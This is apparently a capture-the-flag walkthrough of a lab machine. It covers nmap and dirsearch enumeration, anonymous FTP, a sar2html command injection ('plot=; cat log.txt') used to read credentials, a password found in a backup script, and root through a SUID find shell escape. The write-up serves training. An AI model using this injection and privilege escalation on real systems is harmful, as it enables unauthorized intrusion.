@@ -1,0 +1,277 @@
+
+Hi guys, welcome to walkthrough 
+Let's take all possible steps and finally become root and get all flags. If you're ready, let's start
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap scan
+
+nmap -Pn -n -A -T4 -p- [ TARGET_İP ] -oN fullscan -vv
+-----------------------------------------------------
+  PORT      STATE SERVICE REASON         VERSION
+  21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to ::ffff:10.8.255.134
+  |      Logged in as ftp
+  |      TYPE: ASCII
+  |      No session bandwidth limit
+  |      Session timeout in seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      At session startup, client count was 1
+  |      vsFTPd 3.0.3 - secure, fast, stable
+  |_End of status
+  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+  |_http-title: Apache2 Ubuntu Default Page: It works
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  | http-robots.txt: 1 disallowed entry 
+  |_/
+  |_http-server-header: Apache/2.4.18 (Ubuntu)
+  10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
+  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+  |_http-favicon: Unknown favicon MD5: 82A42B2F214EC3BC9B185F6D6C9BC2F6
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  |_http-server-header: MiniServ/1.930
+  55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
+  |   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
+  |   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
+  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+  TCP/IP fingerprint:
+  OS:SCAN(V=7.92%E=4%D=1/19%OT=21%CT=1%CU=34325%PV=Y%DS=2%DC=T%G=Y%TM=61E815D
+  OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
+  OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+  OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+  OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+  OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+  OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+  OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+  OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+  OS:=S)
+------------------------------------------------------------------------------------------------------------------------------------------------------------  
+  
+ When we examine the scan, we get the information that 21, that is, the FTP port, can be entered as anonymous from the ports we have.
+  
+ ftp [ TARGET_İP ]
+ -----------------
+  Connected to [ TARGET_İP ].
+  220 (vsFTPd 3.0.3)
+  Name (10.10.80.89:root): anonymous
+  230 Login successful.
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+  ftp> ls *la
+  229 Entering Extended Passive Mode (|||43261|)
+  150 Here comes the directory listing.
+  226 Directory send OK.
+  ftp> ls -la
+  229 Entering Extended Passive Mode (|||45365|)
+  150 Here comes the directory listing.
+  drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
+  drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
+  -rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
+  226 Directory send OK.
+  
+ftp> get .info.txt We download it to our own machine as
+
+cat .info.txt
+   Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! crypted code   cracked: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+i tried every possible encryption and found that it was encrypted as rot13
+
+ 
+------------------------------------------------------------------------------------------------------------------------------------------------------------  
+
+If we go into the details of the enumerations, robots.txt will give us detailed information about port 80, let's visit.
+  
+ User-agent: *
+Disallow: /
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
+  ASCII to text
+  cracked : OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
+  base64
+  cracked : 99b0660cd95adea327c54182baa51584
+  md5
+  cracked : kidding
+------------------------------------------------------------------------------------------------------------------------------------------------------------  
+  
+If we continue, let's take a look at the directories we obtained as a result of the directory scan.
+  
+dirsearch -u http:// [ TARGET_İP ] 
+
+  [08:36:30] Starting: 
+  [08:36:36] 403 -  297B  - /.ht_wsr.txt
+  [08:36:36] 403 -  300B  - /.htaccess.save
+  [08:36:36] 403 -  300B  - /.htaccess.bak1
+  [08:36:36] 403 -  300B  - /.htaccess.orig
+  [08:36:36] 403 -  298B  - /.htaccessBAK
+  [08:36:36] 403 -  298B  - /.htaccessOLD
+  [08:36:36] 403 -  299B  - /.htaccessOLD2
+  [08:36:36] 403 -  290B  - /.htm
+  [08:36:36] 403 -  291B  - /.html
+  [08:36:36] 403 -  297B  - /.httr-oauth
+  [08:36:36] 403 -  300B  - /.htaccess_orig
+  [08:36:36] 403 -  296B  - /.htpasswds
+  [08:36:36] 403 -  300B  - /.htpasswd_test
+  [08:36:36] 403 -  302B  - /.htaccess.sample
+  [08:36:36] 403 -  298B  - /.htaccess_sc
+  [08:36:36] 403 -  301B  - /.htaccess_extra
+  [08:36:37] 403 -  290B  - /.php
+  [08:37:30] 200 -   11KB - /index.html
+  [08:37:33] 301 -  325B  - /joomla/administrator  ->  http://[ TARGET_İP ]/joomla/administrator/***************************
+  [08:37:33] 301 -  311B  - /joomla  ->  http://[ TARGET_İP ]/joomla/ **********************
+  [08:37:38] 200 -   12KB - /joomla/
+  [08:37:39] 200 -  626B  - /manual/index.html
+  [08:37:40] 301 -  311B  - /manual  ->  http[ TARGET_İP ]/manual/ *********************
+  [08:38:04] 200 -  257B  - /robots.txt ***************************
+  [08:38:06] 403 -  300B  - /server-status/
+  [08:38:07] 403 -  299B  - /server-status
+  
+  NOTE : I have specified important works with '*'
+  
+and the continuation of the scan
+  dirsearch -u http://[ TARGET_İP ]/joomla
+  [08:41:52] 301 -  317B  - /joomla/_test  ->  http://[ TARGET_İP ]/joomla/_test/
+  
+------------------------------------------------------------------------------------------------------------------------------------------------------------  
+
+When we visit the directory we have reached, we encounter a site where we can get a possible acceptance related to "sar2html".
+Since I have encountered ssh on different machines with sar2html before, I am sharing the command I found directly without much difficulty in getting an ssh connection, and when we enter the url section and click on the select host section on the left, we obtain the necessary ssh information...
+command; 
+  -------------------
+  plot=; cat log.txt
+  -------------------
+We got s************$ and we saw that it belongs to b*****d
+
+ssh basterd@[TARGET_İP] -p 55007 (important detail is that the port is the same as the ssh one in nmap scan)
+--------------------------------
+The authenticity of host [TARGET_İP]':55007 ([TARGET_İP]:55007)' can't be established.
+ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.80.89]:55007' (ED25519) to the list of known hosts.
+basterd@10.10.80.89's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+$
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+b*****d@Vulnerable:~$ ls -la
+b*****d@Vulnerable:~$ cat backup.sh 
+  REMOTE=1.2.3.4
+
+  SOURCE=/home/stoner
+  TARGET=/usr/local/backup
+
+  LOG=/home/stoner/bck.log
+
+  DATE=`date +%y\.%m\.%d\.`
+  ------------------------------------------------------------
+  stoner passwd
+  USER=stoner
+  ***************#superduperp@$$no1knows***************************
+
+  ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+
+  if [ -d "$SOURCE" ]; then
+      for i in `ls $SOURCE | grep 'data'`;do
+         echo "Begining copy of" $i  >> $LOG
+         scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+         echo $i "completed" >> $LOG
+
+      if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+          rm $SOURCE/$i
+          echo $i "removed" >> $LOG
+          echo "####################" >> $LOG
+          else
+            echo "Copy not complete" >> $LOG
+            exit 0
+      fi 
+      done
+
+
+  else
+
+      echo "Directory is not present" >> $LOG
+      exit 0
+  fi
+
+Now that we have the password of the stoner user, let's switch to the stoner user with the help of 'su'.
+
+b*****d@Vulnerable:~$ su stoner
+Password: 
+
+stoner@Vulnerable:/$ sudo -l
+User stoner may run the following commands on Vulnerable:
+    (root) NOPASSWD: /NotThisTime/MessinWithYa
+We couldn't find any very helpful information.
+
+stoner@Vulnerable:/$ find  -perm -4000 2> /dev/null
+
+  ./bin/su
+  ./bin/fusermount
+  ./bin/umount
+  ./bin/mount
+  ./bin/ping6
+  ./bin/ping
+  ./usr/lib/policykit-1/polkit-agent-helper-1
+  ./usr/lib/apache2/suexec-custom
+  ./usr/lib/apache2/suexec-pristine
+  ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  ./usr/lib/openssh/ssh-keysign
+  ./usr/lib/eject/dmcrypt-get-device
+  ./usr/bin/newgidmap
+  *********************************************./usr/bin/find
+  ./usr/bin/at
+  ./usr/bin/chsh
+  ./usr/bin/chfn
+  ./usr/bin/passwd
+  ./usr/bin/newgrp
+  ./usr/bin/sudo
+  ./usr/bin/pkexec
+  ./usr/bin/gpasswd
+  ./usr/bin/newuidmap
+  
+we found the 'privesc' we were looking for here, let's increase our authority with the help of gtfobins
+
+
+  stoner@Vulnerable:/$ find . -exec /bin/sh -p \; -quit
+  # whoami
+  root
+
+
+
+I wish you a healthy and lots of hacking days, thank you for reading, I hope it was useful...
+
+
+
+
+
+
+
+  
+  
+  
+  
+ 
